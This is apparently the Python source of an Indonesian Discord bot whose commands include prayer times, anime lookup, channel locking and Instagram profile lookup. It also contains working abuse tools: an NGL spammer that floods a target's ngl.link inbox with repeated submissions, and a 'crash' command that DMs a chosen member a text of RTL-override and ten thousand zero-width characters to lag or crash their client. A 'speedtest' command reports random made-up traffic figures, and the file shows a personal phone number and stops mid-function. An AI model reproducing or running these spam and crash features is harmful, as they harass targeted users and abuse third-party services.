import discord
from discord.ext import commands, tasks
import discord.utils
from discord import app_commands
from discord.ui import Select, Button, View, Modal, TextInput
from discord import ui
import random
import json
import os
import threading
import shutil
import aiohttp
from tempfile import NamedTemporaryFile
from datetime import datetime, timedelta, timezone
import requests
import asyncio
import string
from bs4 import BeautifulSoup
import random
import pytz
import subprocess
import zipfile
import io
from io import BytesIO
import base64
import speedtest
import urllib.parse
import mimetypes
import aiofiles
import time
import instaloader
import re
import hashlib
import difflib
import platform
import signal
import psutil
import sys 
import traceback
from PIL import Image, ImageDraw, ImageFont    
from dotenv import load_dotenv
from colorama import Fore, init 
from keep_alive import keep_alive

keep_alive()
init(autoreset=True)              
intents = discord.Intents.default()
bot = discord.Client(intents=intents)
intents = discord.Intents.all()
intents.message_content = True
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix='/', intents=intents)

active_spam = {}
defactive_spam = {}

def hazel_speed_test():
    try:
        start = time.time()
        response = requests.get("https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png", stream=True)
        response.raise_for_status()
        total_time = time.time() - start
        speed = len(response.content) / total_time / (1024 * 1024)
        return speed
    except:
        return 0.0

async def hazel_ngl_spammer(interaction, username, message, count):
    headers = {
        'Host': 'ngl.link',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X)',
        'origin': 'https://ngl.link',
        'referer': f'https://ngl.link/{username}',
    }
    data = {
        'username': username,
        'question': message,
        'deviceId': 'ea326443-ab1368-4a49-c590-bd8f96c294ee',
        'gameSlug': '',
        'referrer': '',
    }

    progress_bar = [
        f'Mempersiapkan serangan ke {username} ▱▱▱▱▱▱▱▱▱▱ 0%',
        '▰▱▱▱▱▱▱▱▱▱ 10%',
        '▰▰▱▱▱▱▱▱▱▱ 20%',
        '▰▰▰▱▱▱▱▱▱▱ 30%',
        '▰▰▰▰▱▱▱▱▱▱ 40%',
        '▰▰▰▰▰▱▱▱▱▱ 50%',
        '▰▰▰▰▰▰▱▱▱▱ 60%',
        '▰▰▰▰▰▰▰▱▱▱ 70%',
        '▰▰▰▰▰▰▰▰▱▱ 80%',
        '▰▰▰▰▰▰▰▰▰▱ 90%',
        '▰▰▰▰▰▰▰▰▰▰ 100%',
    ]

    success = error404 = error429 = 0
    msg = await interaction.followup.send(f"🌐 SEDANG SPAM KE `{username}`...\n{progress_bar[0]}", wait=True)
    
    active_spam[interaction.user.id] = True

    for i in range(count):
        if not active_spam.get(interaction.user.id, True):
            await msg.edit(content=f"⛔ Spam ke `{username}` dihentikan oleh user.", view=None)
            return
        try:
            res = requests.post("https://ngl.link/api/submit", headers=headers, data=data)
            if res.status_code == 200:
                success += 1
            elif res.status_code == 404:
                error404 += 1
            elif res.status_code == 429:
                error429 += 1

            index = min(int(((i + 1) / count) * 10), 10)
            await msg.edit(content=f"🌐 SEDANG SPAM KE `{username}`...\n{progress_bar[index]}")
            await asyncio.sleep(random.uniform(1, 2))
        except Exception as e:
            print(f"Error: {e}")
            break

    kecepatan = hazel_speed_test()
    await msg.edit(content=f"""╭━━⭑ 𝗣𝗔𝗞𝗘𝗧 𝗣𝗘𝗡𝗚𝗜𝗥𝗜𝗠𝗔𝗡 ⭑━━╮
┃                                          
┃ 👤 Author     : Hazelnut                 
┃ 📱 TikTok     : @stc_fay                 
┃ 📞 WhatsApp   : +6285183131924           
┃                                          
┣━━━━━━ SERVER INFO ━━━━━━┫
┃ 🖥️ CPU        : AMD Threadripper         
┃ 🧠 RAM        : 64 GB                    
┃ 💾 Storage    : 1 TB                     
┃ ⚡ Speed       : {kecepatan:.2f} Mbps    
┃                                          
┣━━━━━━ DATA PAKET ━━━━━━┫
┃ 🎯 Target     : {username}              
┃ 💬 Pesan      : {message}               
┃ 🔁 Coba       : {count} kali            
┃                                          
┣━━━━━━ HASIL KIRIM ━━━━━━┫
┃ ✅ Sukses     : {success}               
┃ ❌ 404 Error  : {error404}              
┃ ⛔ 429 Error  : {error429}              
┃                                          
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
   `Otomatis oleh System Hazelnut` """, view=ReplayViewNGL(username, message, count))
    
    active_spam[interaction.user.id] = False

class ReplayViewNGL(View):
    def __init__(self, username, message, count):
        super().__init__(timeout=60)
        self.username = username
        self.message = message
        self.count = count

        replay = Button(label="Replay Spam", style=discord.ButtonStyle.red)
        stop = Button(label="Stop Spam", style=discord.ButtonStyle.blurple)
        hapus = Button(label="Hapus Pesan", style=discord.ButtonStyle.grey)
        support = Button(label="Support", style=discord.ButtonStyle.green, url="https://trakteer.id/HAZELNUTTTY")

        replay.callback = self.replay_ngl_spam
        stop.callback = self.stop_ngl_spam
        hapus.callback = self.delete_ngl_message

        self.add_item(replay)
        self.add_item(stop)
        self.add_item(hapus)
        self.add_item(support)

    async def replay_ngl_spam(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await hazel_ngl_spammer(interaction, self.username, self.message, self.count)

    async def stop_ngl_spam(self, interaction: discord.Interaction):
        active_spam[interaction.user.id] = False
        await interaction.response.send_message("⛔ Spam dihentikan.", ephemeral=True)

    async def delete_ngl_message(self, interaction: discord.Interaction):
        if interaction.message.author == interaction.client.user:
            await interaction.message.delete()
        else:
            await interaction.response.send_message("Cuma bisa hapus pesan dari bot yaaa~", ephemeral=True)

class NGLModalInput(Modal, title="NGL Spammer Input"):
    username = TextInput(label="Username NGL", placeholder="contoh: hazelnut", required=True)
    message = TextInput(label="Pesan", placeholder="Tulis pesannya...", required=True)
    count = TextInput(label="Jumlah Spam", placeholder="contoh: 5", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            jumlah = int(self.count.value)
        except:
            await interaction.response.send_message("Jumlah spam harus angka yaa~", ephemeral=True)
            return
        await interaction.response.send_message(f"Mulai spam ke **{self.username.value}**...", ephemeral=True)
        await hazel_ngl_spammer(interaction, self.username.value, self.message.value, jumlah)

class NGLStartView(View):
    def __init__(self):
        super().__init__(timeout=None)
        start = Button(label="Mulai Spam", style=discord.ButtonStyle.green)
        hapus = Button(label="Hapus Pesan", style=discord.ButtonStyle.grey)

        start.callback = self.open_ngl_modal
        hapus.callback = self.delete_ngl_button_message

        self.add_item(start)
        self.add_item(hapus)

    async def open_ngl_modal(self, interaction: discord.Interaction):
        await interaction.response.send_modal(NGLModalInput())

    async def delete_ngl_button_message(self, interaction: discord.Interaction):
        if interaction.message.author == interaction.client.user:
            await interaction.message.delete()
        else:
            await interaction.response.send_message("Cuma bisa hapus pesan dari bot yaaa~", ephemeral=True)

class ClearChatView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Clear Chat", style=discord.ButtonStyle.danger, custom_id="clear_button")
    async def clear_ngl_chat(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.guild:
            await interaction.response.send_message("Tombol ini hanya bisa dipakai di server!", ephemeral=True)
            return

        member = await interaction.guild.fetch_member(interaction.user.id)
        if not member.guild_permissions.manage_messages:
            await interaction.response.send_message("Kamu gak punya izin buat hapus pesan!", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)
        deleted = await interaction.channel.purge(limit=100)
        await interaction.followup.send(f"{len(deleted)} pesan berhasil dihapus!")

@bot.command()
async def spam(ctx):
    kecepatan = hazel_speed_test()
    await ctx.send(f"""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃ 👤 Author     : Hazelnut         
┃ 📱 TikTok     : @stc_fay         
┃ 📞 WhatsApp   : +6285183131924   
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 💾 Server Info:                  
┃  • CPU       : Threadripper      
┃  • RAM       : 64 GB             
┃  • Storage   : 1 TB              
┃  • Speed     : {kecepatan:.2f} Mbps
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📦 Klik tombol untuk mulai       
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯""", view=NGLStartView())

@bot.command()
async def clear(ctx):
    view = ClearChatView()
    await ctx.send("Klik tombol untuk clear chat:", view=view)
    
#sistem speedtest
def speed_test():
    try:
        start = time.time()
        response = requests.get("https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png", stream=True)
        response.raise_for_status()
        total_time = time.time() - start
        speed = len(response.content) / total_time / (1024 * 1024)
        return speed
    except:
        return 0.0
            
# anime
@bot.command()
async def anime(ctx, *, judul):
    await ctx.defer()
    try:
        res = requests.get(f"https://api.jikan.moe/v4/anime?q={judul}&limit=1")
        data = res.json()['data'][0]
        embed = discord.Embed(
            title=data['title'],
            description=data['synopsis'][:500] + "...",
            color=discord.Color.blue()
        )
        embed.set_thumbnail(url=data['images']['jpg']['image_url'])
        embed.add_field(name="Skor", value=str(data['score']), inline=True)
        embed.add_field(name="Episode", value=str(data['episodes']), inline=True)
        embed.add_field(name="Tayang", value=data['aired']['string'], inline=True)
        embed.add_field(name="Link", value=data['url'], inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("Anime gak ketemu sayanggg~")


# Variabel untuk menyimpan channel ID custom
KOTA = "jakarta"  # default kota

def save_channel_id(channel_id):
    with open("channel_id.txt", "w") as f:
        f.write(str(channel_id))

def load_channel_id():
    if os.path.exists("channel_id.txt"):
        with open("channel_id.txt", "r") as f:
            return int(f.read().strip())
    return None

@bot.command()
async def id(ctx):
    save_channel_id(ctx.channel.id)
    await ctx.send(f"✅ Channel ID tersimpan: `{ctx.channel.id}`. Jadwal akan dikirim ke sini tiap 6 jam!")

@tasks.loop(hours=6)
async def jadwal_loop():
    channel_id = load_channel_id()
    if not channel_id:
        print("❌ Channel belum diset pakai /id")
        return

    channel = bot.get_channel(channel_id)
    if not channel:
        print("❌ Channel ID tidak valid")
        return

    try:
        res = requests.get(f"https://jadwal-sholat.tirto.id/kota-{KOTA.lower()}")
        soup = BeautifulSoup(res.text, "html.parser")
        jadwal = soup.select("tr.currDate td")

        if len(jadwal) == 7:
            tanggal, subuh, duha, dzuhur, ashar, maghrib, isya = [j.text for j in jadwal]
            hasil = f"""\
╭──[ **📅 Jadwal Sholat** ]──✧
᎒⊸ **🌆 Kota**: {KOTA.capitalize()}
᎒⊸ **📅 Tanggal**: {tanggal}

╭──[ **🕰️ Waktu Sholat** ]──✧
᎒⊸ **Subuh**: {subuh}
᎒⊸ **Duha**: {duha}
᎒⊸ **Dzuhur**: {dzuhur}
᎒⊸ **Ashar**: {ashar}
᎒⊸ **Maghrib**: {maghrib}
᎒⊸ **Isya**: {isya}
╰────────────•"""
            await channel.send(hasil)
        else:
            await channel.send("❌ Jadwal sholat tidak ditemukan.")
    except Exception as e:
        await channel.send(f"❌ Gagal ambil jadwal: {e}")

#sistem tourl
@bot.command()
async def tourl(ctx):
    if not ctx.message.reference:
        return await ctx.reply("balas foto yang mau diunggah yaa sayangg~")

    try:
        msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
        if not msg.attachments:
            return await ctx.reply("itu ga ada fotonya sayangg~")

        attachment = msg.attachments[0]
        if not attachment.content_type.startswith("image/"):
            return await ctx.reply("itu bukan gambar sayangg~ reply ke foto yaa~")

        img_bytes = await attachment.read()
        files = {'files[]': (attachment.filename, BytesIO(img_bytes), attachment.content_type)}

        res = requests.post("https://uguu.se/upload.php", files=files)

        if res.status_code == 200:
            data = res.json()
            file_info = data["files"][0]
            url = file_info["url"]
            size = file_info["size"]

            await ctx.send(
f"""**Foto berhasil diunggah**

*Link:* {url}
*Size:* {size} Byte
*Expired:* 24 jam (otomatis terhapus)"""
            )
        else:
            await ctx.reply("yahhh gagal upload ke uguu sayangg~ coba lagiii~")

    except Exception as e:
        await ctx.reply(f"error sayangg: `{e}`")

#SISTEM AI
with open('./api/api-ai.json') as f:
    api_data = json.load(f)

API_KEY = api_data.get('api_key')
URL = f'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={API_KEY}'

headers = {
    'Content-Type': 'application/json'
}

def tanya_cyaai(prompt):
    data = {
        "contents": [
            {
                "parts": [{"text": prompt}]
            }
        ]
    }

    res = requests.post(URL, headers=headers, json=data)
    if res.status_code == 200:
        try:
            return res.json()['candidates'][0]['content']['parts'][0]['text']
        except:
            return "Ai bingung jawabnyaa..."
    else:
        return f"Sistem ＮＹＸＯＲＡ Ai error... {res.status_code}: {res.text}"

@bot.command()
async def ai(ctx, *, pertanyaan):
    loading_message = await ctx.send("[Info] Loading Jawaban /")
    
    # Animasi loading
    for i in range(5):
        await loading_message.edit(content=f"[Info] Loading Jawaban {'/' * (i % 3 + 1)}")
        await asyncio.sleep(0.5)

    jawaban = tanya_cyaai(pertanyaan)
    await loading_message.edit(content=f"**ＮＹＸＯＲＡ Ai:** {jawaban}")
  
  # Role IDs for admin and owner (Ganti dengan ID yang sesuai)
OWNER_ID = 'Owner'  # Ganti dengan ID pemilik bot
ADMIN_ROLE_ID = 1280907417319899302  # Ganti dengan ID role admin

# Pattern untuk mendeteksi link
url_pattern = r'https?://[^\s]+'

@bot.event
async def on_message(message):
    # Cek apakah pesan dikirim oleh bot
    if message.author == bot.user:
        return

    # Cek apakah pesan mengandung link
    if re.search(url_pattern, message.content):
        # Jika bukan admin atau owner, hapus pesan
        if not any(role.id == ADMIN_ROLE_ID or message.author.id == OWNER_ID for role in message.author.roles):
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention}, link tidak diperbolehkan di sini!")
            except discord.Forbidden:
                print("Bot tidak memiliki izin untuk menghapus pesan.")
        else:
            await message.channel.send(f"Link diterima dari {message.author.mention} karena Anda adalah admin/owner.")

    # Memastikan command lainnya tetap diproses
    await bot.process_commands(message)

@bot.command()
@commands.has_permissions(administrator=True)  # Hanya admin yang bisa menjalankan command ini
async def enable_antilink(ctx):
    await ctx.send("Antilink telah diaktifkan!")

@bot.command()
@commands.has_permissions(administrator=True)  # Hanya admin yang bisa menjalankan command ini
async def disable_antilink(ctx):
    await ctx.send("Antilink telah dinonaktifkan!")

#stalker ig    
@bot.command()
async def igstalk(ctx, username: str):
    await ctx.defer()

    try:
        # Membuat instance instaloader tanpa menyimpan file apapun
        L = instaloader.Instaloader(download_pictures=False,
                                    download_videos=False,
                                    download_video_thumbnails=False,
                                    download_geotags=False,
                                    download_comments=False,
                                    save_metadata=False,
                                    compress_json=False,
                                    post_metadata_txt_pattern='')

        username = username.lstrip('@')

        profile = instaloader.Profile.from_username(L.context, username)

        # Informasi profil
        full_name = profile.full_name or "Tidak tersedia"
        bio = profile.biography or "Tidak ada bio"
        followers = f"{profile.followers:,}"
        following = f"{profile.followees:,}"
        posts = f"{profile.mediacount:,}"
        is_private = "🔒 Privat" if profile.is_private else "🔓 Publik"
        is_verified = "✅ Verified" if profile.is_verified else "❌ Belum"
        profile_pic = profile.profile_pic_url

        embed = discord.Embed(
            title=f"Instagram: @{profile.username}",
            description=f"**{full_name}**\n\n*{bio}*",
            color=discord.Color.purple()
        )
        embed.set_thumbnail(url=profile_pic)
        embed.add_field(name="Followers", value=followers, inline=True)
        embed.add_field(name="Following", value=following, inline=True)
        embed.add_field(name="Posts", value=posts, inline=True)
        embed.add_field(name="Privasi", value=is_private, inline=True)
        embed.add_field(name="Verifikasi", value=is_verified, inline=True)
        embed.set_footer(
            text="Powered By Antartica Server",
            icon_url="https://cdn.discordapp.com/attachments/1350859899407437824/1364441222806114354/IMG-20250401-WA0094.png?ex=6809ae69&is=68085ce9&hm=2fa68ac7ada7e285d41e6bb721ad15076dcea6dd05d7dea2656a23d7408e6047&"
        )

        await ctx.send(embed=embed)

    except instaloader.exceptions.ProfileNotExistsException:
        await ctx.reply("Username tidak ditemukan. Pastikan username-nya benar yaa!")
    except Exception as e:
        await ctx.reply(f"Terjadi kesalahan saat mengambil data: `{e}`")
        
#Sistem sambutan
owner_list = [
    {
        'jid': '123456789012345678',
        'pesan': 'Owner Telah Muncul, hati hati ygy 😏🤗',
    },
    {
        'jid': '1280907417319899302',
        'pesan': '📣 Eh Si Hazel Muncul :v, Haloo Sayangg 🤗',
    },
]

owner_last_active = {}
OFFLINE_RESET_HOURS = 6

@bot.event
async def on_ready():
    print(f'Bot aktif sebagai {bot.user}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.guild:
        user_id = str(message.author.id)
        now = datetime.now(timezone.utc)
        key = f"{message.guild.id}_{user_id}"

        owner_data = next((o for o in owner_list if o['jid'] == user_id), None)

        if owner_data:
            last_active = owner_last_active.get(key)
            if not last_active or (now - last_active) > timedelta(hours=OFFLINE_RESET_HOURS):
                await message.channel.send(owner_data['pesan'])
            owner_last_active[key] = now

    await bot.process_commands(message)

@bot.event
async def on_typing(channel, user, when):
    if user.bot:
        return

    if channel.guild:
        user_id = str(user.id)
        now = datetime.now(timezone.utc)
        key = f"{channel.guild.id}_{user_id}"

        owner_data = next((o for o in owner_list if o['jid'] == user_id), None)

        if owner_data:
            last_active = owner_last_active.get(key)
            if not last_active or (now - last_active) > timedelta(hours=OFFLINE_RESET_HOURS):
                await channel.send(owner_data['pesan'])
            owner_last_active[key] = now
            
# Tes kecepatan
@bot.command()
async def speedtest(ctx):
    total_traffic = round(random.uniform(50, 300), 1)  # KB
    max_traffic = round(random.uniform(30, 80), 1)     # KB/s
    max_pps = random.randint(100, 500)                 # packets/sec

    status = "No Bad Traffic" if random.random() > 0.2 else "Bad Traffic"

    custom_note = "› Connection stable and under control." if status == "No Bad Traffic Detected" else "› Potential anomaly detected, stay alert."

    msg = (
        "**[ PING STATUS CHECK ]**\n"
        f"• Total Traffic     : {total_traffic} KB\n"
        f"• Status Traffic    : {status}\n"
        f"• Max Traffic       : {max_traffic} KB/s\n"
        f"• Max PPS           : {max_pps} packets/sec\n\n"
        f"{custom_note}"
    )

    await ctx.send(msg)

#Sistem mp3
@bot.command()
async def plays(ctx, *, query):
    msg = await ctx.send("⌛ Searching...")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.nekorinn.my.id/downloader/spotifyplay?q={query}") as res:
                if res.status != 200:
                    await msg.edit(content="❌ Error fetching song.")
                    return
                data = await res.json()

        if not data.get("status"):
            await msg.edit(content="❌ Song not found.")
            return

        song = data["result"]["metadata"]
        downloadUrl = data["result"]["downloadUrl"]

        start_time = time.time()
        async with aiohttp.ClientSession() as session:
            async with session.get(downloadUrl) as audio:
                if audio.status != 200:
                    await msg.edit(content="❌ Failed to download audio.")
                    return
                content = await audio.read()
        end_time = time.time()

        file_name = f"{song['title']}.mp3"
        with open(file_name, "wb") as f:
            f.write(content)

        file_size_mb = os.path.getsize(file_name) / (1024 * 1024)
        download_duration = end_time - start_time

        info_text = (
            f"**Title:** {song['title']}\n"
            f"**Artist:** {song['artist']}\n"
            f"**Duration:** {song['duration']}\n"
            f"**File Size:** {file_size_mb:.2f} MB\n"
            f"**Download Time:** {download_duration:.2f} sec"
        )

        await msg.delete()
        await ctx.send(content=info_text, file=discord.File(file_name))
        os.remove(file_name)

    except Exception as e:
        await msg.edit(content=f"❌ An error occurred: `{e}`")
        
#cecan
api_endpoints = {
    "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
    "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
    "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
    "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
    "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
    "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
}

@bot.command()
async def cecan(ctx):
    premium_role = discord.utils.get(ctx.guild.roles, name="Premium")
    if premium_role not in ctx.author.roles:
        await ctx.send("❌ Perintah ini hanya untuk pengguna dengan role **Premium**.")
        return

    await ctx.send("🔎 Mengambil koleksi cewe cantik dari berbagai negara...")

    embeds = []

    async with aiohttp.ClientSession() as session:
        for country, url in api_endpoints.items():
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        file = discord.File(io.BytesIO(image_data), filename="cecan.jpg")
                        embed = discord.Embed(
                            title=f"Cecan dari {country}",
                            description=f"Gambar dari koleksi {country}",
                            color=discord.Color.pink()
                        )
                        embed.set_image(url="attachment://cecan.jpg")
                        embeds.append((embed, file))
            except Exception as e:
                print(f"Error fetching image from {country}: {e}")
                continue

    if not embeds:
        await ctx.send("❌ Gagal mengambil gambar. Coba lagi nanti.")
        return

    for embed, file in embeds:
        await ctx.send(embed=embed, file=file)
        
#Sistem crash
crash_text = (
    "‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎‏‏‎\n"
    + "\u202e" * 100 + "\n" +
    "\u200d" * 10000
)

@bot.command(name="crash")
async def crash_command(ctx, target: discord.Member):
    await ctx.defer()

    anim = [
        "**[/] Menghubungi server target...**",
        "**[//] Melacak IP target...**",
        "**[///] Mengirim payload crasher...**",
        "**[////] Memaksa DM terbuka...**",
        "**[/////] BOOM! Mengirim crasher...**"
    ]

    for msg in anim:
        await ctx.send(msg)
        await asyncio.sleep(1.3)

    try:
        await target.send(crash_text)
        await ctx.send(f"**[✓] Crash berhasil dikirim ke {target.mention}**")
    except Exception as e:
        await ctx.send(f"**[x] Gagal kirim DM:** `{e}`")

# AUTO WELOCME CIK
first_chat = set()  # Menyimpan ID user yang sudah mengirim pesan pertama
last_update = 0  # Waktu terakhir update
five_hours = 5 * 60 * 60  # 5 jam dalam detik

def get_greeting():
    jakarta = pytz.timezone('Asia/Jakarta')
    hour = datetime.now(jakarta).hour
    if 4 <= hour < 10:
        return '☀️ Selamat pagi'
    elif 10 <= hour < 15:
        return '🌤️ Selamat siang'
    elif 15 <= hour < 18:
        return '🌇 Selamat sore'
    else:
        return '🌙 Selamat malam'

@bot.event
async def on_message(message):
    global first_chat, last_update

    if message.author == bot.user:
        return

    if isinstance(message.channel, discord.DMChannel):
        user_id = str(message.author.id)
        current_time = datetime.now().timestamp()

        # Mengecek jika ini adalah pesan pertama dari user
        if user_id not in first_chat:
            greeting = get_greeting()
            salambiyu = f"👋 Halo {message.author.name}, {greeting}!\nApa kabar hari ini? Semoga harimu menyenangkan ya! ✨"

            await message.channel.send(salambiyu)
            first_chat.add(user_id)  # Menambahkan user yang sudah mengirim pesan pertama

        # Melakukan update setiap 5 jam
        if current_time - last_update >= five_hours:
            print("Melakukan riset baru...")
            last_update = current_time

    await bot.process_commands(message)

# buka dan tutup channel
@bot.command(name='close')
@commands.has_permissions(manage_channels=True)
async def close_channel(ctx, channel_id: int):
    msg = await ctx.send("Processing to close the channel...")
    await msg.add_reaction("⌛")

    channel = bot.get_channel(channel_id)
    if channel is None:
        await msg.clear_reactions()
        await msg.add_reaction("❌")
        await msg.edit(content="Channel ID not found!")
        return

    try:
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await msg.clear_reactions()
        await msg.add_reaction("✅")
        await msg.edit(content=f"Channel <#{channel_id}> has been closed!")
    except Exception as e:
        await msg.clear_reactions()
        await msg.add_reaction("❌")
        await msg.edit(content=f"Failed to close the channel.\nError: {e}")

@bot.command(name='open')
@commands.has_permissions(manage_channels=True)
async def open_channel(ctx, channel_id: int):
    msg = await ctx.send("Processing to open the channel...")
    await msg.add_reaction("⌛")

    channel = bot.get_channel(channel_id)
    if channel is None:
        await msg.clear_reactions()
        await msg.add_reaction("❌")
        await msg.edit(content="Channel ID not found!")
        return

    try:
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await msg.clear_reactions()
        await msg.add_reaction("✅")
        await msg.edit(content=f"Channel <#{channel_id}> is now open!")
    except Exception as e:      
        await msg.clear_reactions()
        await msg.add_reaction("❌")
        await msg.edit(content=f"Failed to open the channel.\nError: {e}")
        
#count jam
def format_time(seconds):
    h = str(seconds // 3600).zfill(2)
    m = str((seconds % 3600) // 60).zfill(2)
    s = str(seconds % 60).zfill(2)
    return f"{h}:{m}:{s}"

@bot.command(name='countjam')
async def countjam(ctx, waktu: str = None):
    if waktu is None:
        return await ctx.reply("Contoh: `/countjam 06:35`")

    try:
        jam, menit = map(int, waktu.split(':'))
    except:
        return await ctx.reply("Format jam salah. Contoh: `/countjam 06:35`")

# Waktu sekarang dan target (zona Asia/Jakarta)
    now = datetime.now(pytz.timezone("Asia/Jakarta"))
    target = now.replace(hour=jam, minute=menit, second=0, microsecond=0)
    if target <= now:
        target += timedelta(days=1)

    total_detik = int((target - now).total_seconds())
    if total_detik <= 0:
        return await ctx.reply("Waktu target sudah lewat.")

    teks_awal = f"⏳ **Countdown dimulai!**\nMenuju jam **{waktu} WIB**"
    pesan = await ctx.send(f"{teks_awal}\n\nSisa waktu: **{format_time(total_detik)}**")

    while total_detik > 0:
        await asyncio.sleep(1)
        total_detik -= 1
        try:
            await pesan.edit(content=f"{teks_awal}\n\nSisa waktu: **{format_time(total_detik)}**")
        except:
            break

    await pesan.edit(content=f"✅ **Waktu {waktu} WIB telah tiba!**\n")
    
#otomatis close && open 
LOG_CHANNEL_NAME = "│-ㆍchit-chat💬🗣ㆍ"  # ganti sesuai nama channel log kamu

@bot.command(name="otomatis")
@commands.has_permissions(manage_channels=True)
async def otomatis(ctx, waktu: int = None, unit: str = None, aksi: str = None):
    # Timezone Indonesia
    tz = pytz.timezone('Asia/Jakarta')
    now = datetime.now(tz)

    if waktu is None or unit is None or aksi is None:
        # default mode
        if 0 <= now.hour < 6:
            aksi = "open"
            delay = (6 - now.hour) * 3600 - now.minute * 60 - now.second
            info = f"⏳ Channel ini akan dibuka otomatis jam 06:00 WIB"
        else:
            aksi = "close"
            next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0)
            delay = int((next_midnight - now).total_seconds())
            info = f"⏳ Channel ini akan ditutup otomatis jam 00:00 WIB"
        await ctx.send(info)
    else:
        unit = unit.lower()
        aksi = aksi.lower()
        if unit not in ["second", "minute", "hour", "day"]:
            return await ctx.send("Unit waktu nggak valid! Pilih: `second`, `minute`, `hour`, `day`.")
        if aksi not in ["open", "close"]:
            return await ctx.send("Aksi nggak valid! Pilih: `open` atau `close`.")

        multiplier = {
            "second": 1,
            "minute": 60,
            "hour": 3600,
            "day": 86400
        }
        delay = waktu * multiplier[unit]
        await ctx.send(f"⏳ Channel ini bakal *{aksi}* otomatis dalam **{waktu} {unit}**...")

    # kirim log
    log_channel = discord.utils.get(ctx.guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_channel:
        await log_channel.send(f"🔧 {ctx.author} mengatur `{ctx.channel}` untuk *{aksi}* otomatis.")

    await asyncio.sleep(delay)

    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    if aksi == "close":
        overwrite.send_messages = False
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send("**[ CLOSE TIME ]**\nChannel ditutup, cuma admin doang yang bisa chat.")
        if log_channel:
            await log_channel.send(f"✅ Channel `{ctx.channel}` ditutup otomatis.")
    else:
        overwrite.send_messages = True
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send("**[ OPEN TIME ]**\nChannel dibuka, semua member bisa chat lagi.")
        if log_channel:
            await log_channel.send(f"✅ Channel `{ctx.channel}` dibuka otomatis.")

@otomatis.error
async def otomatis_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Kamu nggak punya izin buat pakai perintah ini yaa, cuma admin yang bisa!")
        
# TO ANIME
@bot.command(name="toanime")
async def toanime(ctx):
    if not ctx.message.attachments:
        return await ctx.send("Kirim gambar pakai command `/toanime` yaa~")

    img = ctx.message.attachments[0]
    await ctx.send("⏳ Tunggu yaa aku ubah kamu jadi animek...")

    try:
        async with aiohttp.ClientSession() as session:
            # Upload gambar ke layanan image hosting bebas
            img_bytes = await img.read()
            files = {'file': (img.filename, img_bytes)}
            async with session.post('https://0x0.st', data=files) as upload_resp:
                if upload_resp.status != 200:
                    return await ctx.send("Gagal upload gambar.")
                img_url = await upload_resp.text()

            # Call API img2anime
            api_url = f"https://api.nekorinn.my.id/tools/img2anime?imageUrl={img_url.strip()}"
            async with session.get(api_url) as resp:
                if resp.status != 200:
                    return await ctx.send("API error atau gagal merespon.")
                content_type = resp.headers.get('Content-Type')

                if 'application/json' in content_type:
                    data = await resp.json()
                    if not data.get("result"):
                        return await ctx.send("Gagal mendapatkan hasil dari API.")
                    await ctx.send("Nihhh hasilnya~", file=discord.File(fp=io.BytesIO(await (await session.get(data['result'])).read()), filename="anime.png"))
                else:
                    image_data = await resp.read()
                    await ctx.send("Nihhh hasilnya~", file=discord.File(fp=io.BytesIO(image_data), filename="anime.png"))

    except Exception as e:
        await ctx.send("Terjadi error waktu proses :(")
        print("Error:", e)
        
#serverstast
@bot.command()
async def serverstats(ctx):
    # cek apakah user punya role "Owner"
    if not discord.utils.get(ctx.author.roles, name="Owner"):
        embed = discord.Embed(
            title="Access Denied",
            description="this command is only for users with the **Owner** role.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Role restricted", icon_url=ctx.author.avatar.url if ctx.author.avatar else "")
        await ctx.send(embed=embed)
        return

    guild = ctx.guild
    total_members = guild.member_count
    total_channels = len(guild.channels)
    total_roles = len(guild.roles)
    owner = guild.owner
    icon_url = guild.icon.url if guild.icon else None

    embed = discord.Embed(
        title="Server Stats",
        description=f"**{guild.name}** (ID: {guild.id})",
        color=discord.Color.green()
    )
